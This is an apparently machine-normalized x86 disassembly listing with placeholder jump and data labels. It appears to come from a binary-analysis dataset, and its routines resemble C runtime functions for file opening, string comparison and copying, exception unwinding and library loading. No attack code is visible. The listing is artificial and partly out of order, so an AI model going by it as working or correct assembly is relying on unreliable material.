jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_440cbb
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1a
jne r-xdata
push [ esi ]
call sub_440e04
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_43c072
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_442d1c
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_44fc25
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_4403c9
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_44bd22
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_44bd22
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_440e04
pop ecx
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_440cbb
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_44ad99
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_440cbb
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_44bd22
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_44bd22
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_44c684
push 0x14
push r--data
call sub_43f8e0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_43f925
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_44bf4f
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44c71a
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_44c71a
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_442eaa
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_44c748
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_44c684
add esp 0x18
pop ebp
retn
sub_44c768
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push ebx
push edi
cmp [ ebp + 0x10 ] eax
je r-xdata
pop edi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0x7fffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_4428f4
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_4428f4
add esp 0x10
add ebx 0x2
add edi 0x2
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
sub ebx edi
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test si si
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
add edi 0x2
dec [ ebp + 0x10 ]
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
cmp si ax
je r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_44c84d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44c768
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
dec [ ebp + 0x10 ]
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
cmp dx ax
je r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_44c8eb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
add ecx 0x2
add edx 0x2
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_44c930
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c950
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_437c1c
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_44c995
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_44c995
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_44c950
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_44ca45
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_44ca64
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_44ca3c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_44ca45
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_44ca67
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_43fe30
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_44cbd3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_43f8c5
mov eax esi
sub_44cc48
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_44cd15
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_44cd54
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_44cdc0
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_44ce15
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_44ce4e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_44ce15
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_43ec96
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_43ec96
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_44cf0e
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44ce4e
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_44ce15
sub_44cf6b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_44fde0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_43ec96
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_43ec96
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_44d04d
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44cf6b
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_44fde0
sub_44d0a0
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_44d240
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_44d26d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_438ce6
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44f549
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_44eaa7
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
sub_44d315
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_438ce6
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44f549
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_44eff8
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
sub_44d3bd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_43c860
inc eax
push eax
push edi
push esi
call sub_437db0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_44d470
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
